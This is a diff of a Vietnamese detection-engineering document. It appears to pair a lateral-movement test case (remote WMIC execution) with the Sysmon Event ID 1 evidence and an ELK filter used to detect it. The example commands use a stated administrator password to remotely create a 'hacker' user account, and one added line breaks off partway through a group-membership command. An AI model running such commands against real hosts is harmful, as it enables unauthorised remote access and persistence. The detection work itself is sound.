@@ -56,7 +56,8 @@ Invoke-Command -ComputerName "winsrv" -ScriptBlock { Get-ChildItem C:\ } -Creden
 
 ## Test case 5: WMIC
 * Command: `wmic /node:IP /user:[domain]\[Tài khoản Victim] /password:[Password của Victim] [Lệnh]`
-* Ví dụ: `wmic /node:192.168.255.100 /user:WINSRV2008\administrator /password:123abc!!! process call create "cmd.exe /c net user hacker /add"`
+* Ví dụ: `wmic /node:192.168.255.100 /user:WINSRV2008\administrator /password:123abc!!! process call create "cmd.exe /c net user hacker p@ssword /add"`
+* `wmic /node:192.168.255.100 /user:WINSRV2008\administrator /password:123abc!!! process call create "cmd.exe /c net localgroup `
 * Bằng chứng thực thi: **Event ID 1** tại Sysmon Event Log: (Process Create): Tiến trình WmiPrvSE.exe khởi động chứng tỏ có một phiên WMIC được tiến hành từ xa và sau đó là các lệnh thực thi được ghi lại tại Sysmon Event Log
 * Chuyển sang dạng filter trong ELK:
   * `event.code: 1`
